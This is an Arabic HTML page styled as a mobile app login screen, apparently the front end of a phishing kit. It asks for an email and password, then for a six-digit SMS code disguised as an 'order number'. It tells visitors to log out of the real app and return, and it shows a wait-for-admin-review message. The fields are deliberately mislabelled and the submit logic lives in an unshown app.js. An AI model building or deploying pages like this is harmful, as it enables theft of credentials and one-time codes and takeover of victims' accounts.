<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<title>تقديم طلب</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html {
    min-height: 100%;
    background: #03070f;
    -webkit-text-size-adjust: 100%;
    text-size-adjust: 100%;
  }

  body {
    font-family: 'Tajawal', 'Segoe UI', Tahoma, Arial, sans-serif;
    background: radial-gradient(circle at 50% 20%, #0d2240 0%, #060f24 55%, #03070f 100%);
    min-height: 100vh;
    min-height: 100dvh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: max(12px, env(safe-area-inset-top)) max(12px, env(safe-area-inset-right)) max(12px, env(safe-area-inset-bottom)) max(12px, env(safe-area-inset-left));
    overflow-x: hidden;
  }

  .phone {
    width: 100%;
    max-width: 380px;
    width: min(380px, 100%);
    min-height: min(760px, calc(100dvh - 24px));
    background: linear-gradient(180deg, #0c1f3d 0%, #081730 50%, #040b1c 100%);
    border-radius: 36px;
    padding: clamp(18px, 5vw, 24px) clamp(16px, 5vw, 22px) clamp(22px, 6vw, 30px);
    position: relative;
    box-shadow: 0 0 60px rgba(0,0,0,0.6);
    display: flex;
    flex-direction: column;
  }

  .topbar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    color: #fff;
    margin-bottom: clamp(18px, 5vh, 30px);
  }
  .topbar .lang { font-size: 14px; color: #e6edf7; }
  .support-icon { font-size: 18px; color: #fff; }

  .logo {
    display: flex;
    justify-content: center;
    margin: clamp(18px, 6vh, 30px) 0 clamp(28px, 7vh, 50px);
  }
  .logo svg {
    width: clamp(82px, 24vw, 100px);
    height: auto;
    aspect-ratio: 100 / 90;
  }

  .title {
    color: #fff;
    font-size: clamp(23px, 6vw, 26px);
    font-weight: 700;
    text-align: right;
    margin-bottom: clamp(20px, 5vh, 26px);
  }

  .request-note {
    position: relative;
    overflow: hidden;
    color: #eaf2ff;
    background: linear-gradient(135deg, rgba(31, 92, 180, 0.32), rgba(20, 184, 166, 0.18));
    border: 1px solid rgba(147, 197, 253, 0.28);
    border-radius: 14px;
    margin: calc(clamp(20px, 5vh, 26px) * -0.35) 0 18px;
    padding: 12px 12px 13px;
    box-shadow: 0 12px 28px rgba(0, 0, 0, 0.22), inset 0 1px 0 rgba(255,255,255,0.08);
  }

  .note-head {
    display: flex;
    align-items: center;
    gap: 8px;
    margin-bottom: 9px;
  }

  .note-icon {
    width: 26px;
    height: 26px;
    border-radius: 50%;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    background: rgba(250, 204, 21, 0.18);
    color: #fde68a;
    font-size: 15px;
    font-weight: 700;
    flex-shrink: 0;
  }

  .note-title {
    color: #fff;
    font-size: 15px;
    font-weight: 700;
  }

  .note-text {
    border-radius: 10px;
    background: rgba(3, 7, 18, 0.24);
    border: 1px solid rgba(255,255,255,0.07);
    color: #dbeafe;
    font-size: 13.5px;
    font-weight: 500;
    line-height: 1.5;
    padding: 10px 12px;
    text-align: right;
  }

  .field {
    display: flex;
    direction: ltr;
    align-items: center;
    background: linear-gradient(180deg, #1b3a66, #14294c);
    border-radius: 14px;
    padding: 14px 16px;
    margin-bottom: 14px;
    border: 1px solid rgba(255,255,255,0.05);
  }
  .field input {
    flex: 1;
    background: transparent;
    border: none;
    outline: none;
    color: #fff;
    font-size: 16px;
    font-weight: 500;
    text-align: right;
    direction: rtl;
    min-width: 0;
  }
  .field input::placeholder { color: #fff; opacity: 1; }
  .field .icon {
    color: #fff;
    font-size: 18px;
    margin-right: 0;
    margin-left: 10px;
    width: 20px;
    text-align: center;
  }

  .field .email-icon {
    color: #fff;
  }

  .new-user {
    color: #fff;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
  }

  .account-links {
    display: flex;
    justify-content: flex-start;
    gap: 8px;
    flex-wrap: wrap;
    margin: 8px 0 22px;
  }

  .action-row {
    display: flex;
    direction: ltr;
    gap: 12px;
    margin-bottom: 18px;
  }
  .qr-btn {
    width: clamp(54px, 16vw, 60px);
    height: 56px;
    border-radius: 14px;
    background: linear-gradient(180deg, #2f6fe0, #1c4fb8);
    display: flex;
    align-items: center;
    justify-content: center;
    color: #fff;
    font-size: 22px;
    flex-shrink: 0;
    cursor: pointer;
    border: none;
  }
  .submit-btn {
    flex: 1;
    height: 56px;
    border-radius: 14px;
    background: linear-gradient(180deg, #3d7df5, #2358c9);
    color: #fff;
    font-size: 17px;
    font-weight: 700;
    border: none;
    cursor: pointer;
  }

  .submit-btn:disabled,
  .qr-btn:disabled {
    opacity: 0.7;
    cursor: not-allowed;
  }

  .create-new {
    color: #4e8df0;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
  }

  .message {
    border-radius: 12px;
    font-size: 14px;
    line-height: 1.7;
    margin-top: 18px;
    padding: 12px;
    text-align: center;
  }

  .message.success {
    background: rgba(20, 184, 166, 0.14);
    color: #99f6e4;
  }

  .message.error {
    background: rgba(239, 68, 68, 0.14);
    color: #fecaca;
  }

  .waiting-panel {
    color: #fff;
    text-align: right;
  }

  .order-note {
    color: #dbeafe;
    font-size: 14px;
    font-weight: 600;
    line-height: 1.6;
    margin: -4px 0 12px;
    text-align: right;
  }

  .waiting-text {
    background: linear-gradient(180deg, #1b3a66, #14294c);
    border: 1px solid rgba(255,255,255,0.05);
    border-radius: 14px;
    font-size: 16px;
    font-weight: 500;
    line-height: 1.8;
    padding: 18px 16px;
  }

  .hidden { display: none; }
  .spacer { flex: 1; }

  .version {
    text-align: center;
    color: #8fa3c4;
    font-size: 13px;
    margin-top: 30px;
  }

  @media (max-width: 430px) {
    .phone {
      width: 100%;
      min-height: calc(100dvh - 24px);
      border-radius: 28px;
    }
  }

  @media (max-height: 700px) {
    .phone {
      min-height: calc(100dvh - 16px);
    }

    .topbar {
      margin-bottom: 14px;
    }

    .logo {
      margin: 14px 0 24px;
    }

    .field {
      padding: 12px 14px;
      margin-bottom: 12px;
    }

    .submit-btn,
    .qr-btn {
      height: 52px;
    }

    .version {
      margin-top: 18px;
    }
  }
</style>
</head>
<body>

<div class="phone">
  <div class="topbar">
    <span class="support-icon">&#127911;</span>
    <span class="lang">الإنكليزية</span>
  </div>

  <div class="logo">
    <svg viewBox="0 0 120 110" xmlns="http://www.w3.org/2000/svg">
      <polygon points="60,5 110,40 80,40 40,65 20,52" fill="#2563eb"/>
      <polygon points="20,52 60,78 60,105 10,72 10,52" fill="#14b8a6"/>
      <polygon points="40,65 80,40 110,40 70,65" fill="#3b82f6"/>
    </svg>
  </div>

  <div class="title" id="pageTitle">تسجيل الدخول </div>

  <div class="request-note" role="note" aria-label="تنويه مهم قبل تقديم الطلب">
    <div class="note-head">
      <span class="note-icon">!</span>
      <span class="note-title">تنويه مهم قبل تقديم الطلب</span>
    </div>
    <div class="note-text">يرجى فتح التطبيق، ثم تسجيل الخروج من الحساب، وبعد ذلك الرجوع إلى هذه الصفحة لإكمال تقديم الطلب.</div>
  </div>

  <form id="requestForm" novalidate>
    <div class="field">
      <input id="email" type="email" required placeholder="البريد الإلكتروني" dir="rtl">
      <span class="icon email-icon">&#128100;</span>
    </div>

    <div class="field">
      <input id="name" type="text" required placeholder="كلمة المرور  " dir="rtl">
      <span class="icon" style="margin-left:8px;">&#128065;</span>
    </div>

    <div class="account-links">
      <span class="new-user">هل نسيت كلمة المرور    </span>
      <span class="create-new">تغيير كلمة المرور   </span>
    </div>

    <div class="action-row">
      <button class="qr-btn" type="button" id="qrButton">&#9783;</button>
      <button class="submit-btn" type="submit" id="submitButton">تسجيل دخول  </button>
    </div>
  </form>

  <form id="orderForm" class="hidden">
    <div class="order-note">تم ارسال رسالة نصية على جهازك عبر sms</div>

    <div class="field">
      <input id="orderNumber" type="text" maxlength="6" pattern="\d{6}" required placeholder="رقم الطلب" inputmode="numeric" dir="rtl">
      <span class="icon">&#35;</span>
    </div>

    <div class="action-row">
      <button class="qr-btn" type="button" id="backButton">&#8594;</button>
      <button class="submit-btn" type="submit" id="orderSubmitButton">إرسال الطلب</button>
    </div>
  </form>

  <div id="waitingPanel" class="waiting-panel hidden">
    <div class="waiting-text">يرجى الانتظار حتى يتم مراجعة الطلب من الأدمن...</div>
  </div>

  <div id="message" class="message hidden"></div>

  <div class="spacer"></div>

  <div class="version">V 2.2.6</div>
</div>

<script type="module" src="app.js"></script>
</body>
</html>
